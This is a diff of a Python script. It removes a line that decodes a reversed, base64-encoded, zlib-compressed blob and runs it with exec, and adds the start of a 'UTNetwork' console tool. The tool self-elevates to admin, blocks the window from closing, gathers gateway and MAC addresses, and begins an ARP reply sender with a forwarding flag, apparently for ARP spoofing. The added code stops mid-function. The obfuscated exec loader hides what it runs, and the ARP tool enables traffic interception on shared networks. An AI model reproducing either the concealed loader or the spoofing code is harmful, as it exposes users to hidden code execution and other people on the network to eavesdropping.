@@ -1,1 +1,609 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))
+import os
+import platform
+import socket
+import subprocess
+import sys
+import time
+import webbrowser
+import getpass
+import struct
+import uuid
+from threading import Thread, Lock
+
+BANNER_TEXT = r"""
+  _   _ _____ _   _       _                      _    
+ | | | |_   _| \ | | ___| |___       _____  _ __| | __
+ | | | | | | |  \| |/ _ \ __\ \ /\ / / _ \| '__| |/ /
+ | |_| | | | | |\  |  __/ |_ \ V  V / (_) | |  |  < 
+  \___/  |_| |_| \_|\___|\__| \_/\_/ \___/|_|  |_|\_\
+                                                      
+"""
+
+# Global Control Flags
+FORWARDING_ACTIVE = False
+IS_OBFUSCATED = False  
+print_lock = Lock()
+
+
+def set_console_title():
+    """Dynamically sets the window title bar and configures the taskbar icon handle."""
+    title_str = "UTNetwork"
+    try:
+        if platform.system() == "Windows":
+            import ctypes
+            # 1. Set the Title Text
+            os.system(f"title {title_str}")
+            
+            # 2. Assign unique AppUserModelID so Windows treats this as a standalone application
+            try:
+                myappid = 'duckycashy.ipchecker.networkutility.2026'
+                ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID(myappid)
+            except Exception:
+                pass
+                
+            # 3. Hook Net.ico into the live taskbar frame context
+            icon_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "Net.ico"))
+            if os.path.exists(icon_path):
+                hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+                if hwnd:
+                    # Load image resource matching system taskbar metric scales
+                    hicon = ctypes.windll.user32.LoadImageW(
+                        None, icon_path, 1, 0, 0, 0x00000010 | 0x00000020
+                    )
+                    if hicon:
+                        # Apply to both small (0) and large (1) window display scopes
+                        ctypes.windll.user32.SendMessageW(hwnd, 0x0080, 0, hicon)
+                        ctypes.windll.user32.SendMessageW(hwnd, 0x0080, 1, hicon)
+        else:
+            sys.stdout.write(f"\x1b]2;{title_str}\x07")
+            sys.stdout.flush()
+    except Exception:
+        pass
+
+
+def is_admin():
+    """Checks for administrative/root privileges across Windows and POSIX platforms."""
+    if platform.system() == "Windows":
+        try:
+            import ctypes
+            return ctypes.windll.shell32.IsUserAnAdmin() != 0
+        except Exception:
+            return False
+    return os.getuid() == 0
+
+
+# --- Windows Console Interception Hook ---
+if platform.system() == "Windows":
+    import ctypes
+    
+    def console_handler(ctrl_type):
+        if ctrl_type == 2:  # CTRL_CLOSE_EVENT
+            with print_lock:
+                print("\n[!] Force-close blocked. Please use Option [8] to close cleanly.")
+            return True
+        return False
+
+    HandlerRoutine = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_ulong)
+    handler_callback = HandlerRoutine(console_handler)
+    ctypes.windll.kernel32.SetConsoleCtrlHandler(handler_callback, True)
+
+
+def relaunch_as_admin():
+    """Elevates execution context to administrative level."""
+    os_type = platform.system()
+    print("[*] Elevating privileges... Please accept the prompt.")
+    time.sleep(1)
+
+    try:
+        script = os.path.abspath(sys.argv[0])
+        params = " ".join(sys.argv[1:])
+        if os_type == "Windows":
+            import ctypes
+            ctypes.windll.shell32.ShellExecuteW(
+                None, "runas", sys.executable, f'"{script}" {params}', None, 1
+            )
+            sys.exit(0)
+        else:
+            cmd = ["sudo", sys.executable, script] + sys.argv[1:]
+            os.execvp("sudo", cmd)
+    except Exception as e:
+        print(f"[ERROR] Failed to elevate privileges: {e}")
+        input("\nPress ENTER to continue...")
+
+
+def downgrade_privileges():
+    """Drops administrative access back to a standard user execution context."""
+    os_type = platform.system()
+    print("[*] Dropping administrative clearances... Reverting to normal terminal.")
+    time.sleep(1)
+
+    try:
+        script = os.path.abspath(sys.argv[0])
+        params = sys.argv[1:]
+        current_dir = os.getcwd()
+
+        if os_type == "Windows":
+            cmd_args = f'cmd.exe /k "cd /d {current_dir} && \"{sys.executable}\" \"{script}\" {" ".join(params)}"'
+            subprocess.Popen(cmd_args, shell=False)
+            sys.exit(0)
+        else:
+            user = os.environ.get("SUDO_USER")
+            if user:
+                cmd = ["su", "-", user, "-c", f"cd '{current_dir}' && {sys.executable} {script} {' '.join(params)}"]
+                os.execvp("su", cmd)
+            else:
+                print("[!] Normal shell user identity not found. Cannot safely drop root.")
+                time.sleep(1.5)
+    except Exception as e:
+        print(f"[ERROR] Failed to safely drop privileges: {e}")
+        input("\nPress ENTER to continue...")
+
+
+def is_online():
+    """Validates local network interface up-status via external dummy connection."""
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+            s.connect(("8.8.8.8", 80))
+            return s.getsockname()[0] != "127.0.0.1"
+    except Exception:
+        return False
+
+
+def clear():
+    os.system("cls" if os.name == "nt" else "clear")
+
+
+def show_banner():
+    print(BANNER_TEXT)
+    if is_admin():
+        print(" [STATUS] Running UTNetwork as Administrator")
+    else:
+        print(f" [STATUS] Running UTNetwork as [{getpass.getuser()}].")
+    print("-" * 65)
+
+
+def get_local_ip():
+    """Retrieves primary outbound local IPv4 configuration."""
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+            s.connect(("8.8.8.8", 80))
+            return s.getsockname()[0]
+    except Exception:
+        try:
+            return socket.gethostbyname(socket.gethostname())
+        except socket.error:
+            return None
+
+
+def get_local_ipv6():
+    """Retrieves primary outbound local IPv6 configuration."""
+    try:
+        with socket.socket(socket.AF_INET6, socket.SOCK_DGRAM) as s:
+            # Connect to Google Public DNS via IPv6 to capture active interface IP
+            s.connect(("2001:4860:4860::8888", 80))
+            return s.getsockname()[0]
+    except Exception:
+        return None
+
+
+def get_wifi_ssid():
+    """Queries OS specific configuration handles to resolve active Wi-Fi profile names."""
+    os_type = platform.system()
+    try:
+        if os_type == "Windows":
+            out = subprocess.check_output("netsh wlan show interfaces", shell=True, text=True, errors="ignore")
+            for line in out.splitlines():
+                if " SSID" in line and "BSSID" not in line:
+                    return line.split(":")[1].strip()
+        elif os_type == "Linux":
+            out = subprocess.check_output("nmcli -t -f active,ssid dev wifi", shell=True, text=True)
+            for line in out.splitlines():
+                if line.startswith("yes:"):
+                    return line.split(":")[1].strip()
+        elif os_type == "Darwin":
+            out = subprocess.check_output("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I", shell=True, text=True)
+            for line in out.splitlines():
+                if " SSID" in line:
+                    return line.split(":")[1].strip()
+    except Exception:
+        pass
+    return None
+
+
+def get_local_mac():
+    """Dynamically resolves the host machine's primary physical MAC identity."""
+    try:
+        mac_hex = iter(f"{uuid.getnode():012x}")
+        return bytes.fromhex("".join(a + b for a, b in zip(mac_hex, mac_hex)))
+    except Exception:
+        return b'\x00\x00\x00\x00\x00\x00'
+
+
+def get_gateway_ip():
+    """Queries system routing configurations to isolate the Default Gateway IP."""
+    os_type = platform.system()
+    try:
+        if os_type == "Windows":
+            out = subprocess.check_output("route print 0.0.0.0", shell=True, text=True)
+            for line in out.splitlines():
+                parts = line.split()
+                if len(parts) >= 5 and parts[0] == "0.0.0.0" and parts[1] == "0.0.0.0":
+                    return parts[2]
+        else:
+            out = subprocess.check_output("ip route show default", shell=True, text=True)
+            parts = out.split()
+            if "via" in parts:
+                return parts[parts.index("via") + 1]
+    except Exception:
+        pass
+    return None
+
+
+def get_mac_address(target_ip):
+    """Resolves target Layer-3 IP representation to Layer-2 physical hardware address."""
+    os_type = platform.system()
+    if os_type == "Windows":
+        import ctypes
+        try:
+            ip_bytes = socket.inet_aton(target_ip)
+            ip_num = struct.unpack("I", ip_bytes)[0]
+            mac = ctypes.create_string_buffer(6)
+            mac_len = ctypes.c_ulong(6)
+            if ctypes.windll.iphlpapi.SendARP(ip_num, 0, ctypes.byref(mac), ctypes.byref(mac_len)) == 0:
+                return mac.raw
+        except Exception:
+            pass
+    else:
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.settimeout(0.1)
+                s.connect_ex((target_ip, 80))
+            out = subprocess.check_output(f"arp -n {target_ip}", shell=True, text=True)
+            for line in out.splitlines():
+                if target_ip in line:
+                    for item in line.split():
+                        if ":" in item and len(item) == 17:
+                            return bytes.fromhex(item.replace(":", ""))
+        except Exception:
+            pass
+    return None
+
+
+def get_active_interface_name_windows():
+    """Resolves primary network interface alias dynamically for network configuration updates."""
+    try:
+        out = subprocess.check_output("netsh interface ipv4 show interfaces", shell=True, text=True)
+        for line in out.splitlines():
+            if "Connected" in line and "Loopback" not in line:
+                parts = line.split()
+                if len(parts) >= 5:
+                    return " ".join(parts[4:])
+    except Exception:
+        pass
+    return "Wi-Fi"
+
+
+def send_arp_reply(src_ip, src_mac, dest_ip, dest_mac):
+    """Transmits link-layer ARP response adjustments to current network target context."""
+    os_type = platform.system()
+    try:
+        if os_type == "Windows":
+            iface = get_active_interface_name_windows()
